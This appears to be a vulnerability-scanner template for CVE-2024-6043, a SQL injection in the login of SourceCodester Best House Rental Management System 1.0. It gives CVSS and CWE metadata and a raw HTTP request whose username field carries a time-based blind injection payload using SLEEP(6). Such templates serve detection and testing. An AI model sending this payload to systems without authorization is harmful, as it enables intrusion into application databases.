id: CVE-2024-6043

info:
  name: SourceCodester Best House Rental Management System 1.0 - SQL Injection
  author: Alireza Mokhtari
  severity: high
  description: |
    A vulnerability classified as critical has been found in SourceCodester Best House Rental Management System 1.0. This affects the function login of the file admin_class.php. The manipulation of the argument username leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-268767.
  reference:
    - https://github.com/yezzzo/y3/blob/main/SourceCodester%20Best%20house%20rental%20management%20system%20project%20in%20php%201.0%20SQL%20Injection.md
    - https://vuldb.com/?ctiid.268767
    - https://vuldb.com/?id.268767
    - https://vuldb.com/?submit.358176
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-6043
    cwe-id: CWE-89
    epss-score: 0.00045
    epss-percentile: 0.15922
  metadata:
    max-request: 1
  tags: cve,cve2024,sqli,sourcecodester

http:
  - raw:
      - |
        GET /rental/ajax.php?action=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin'+AND+(SELECT+5426+FROM+(SELECT(SLEEP(6)))ABPy)+AND+'wtFY'='wtFY&password=pass

    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code == 200'
          - 'len(body)<5'
        condition: and
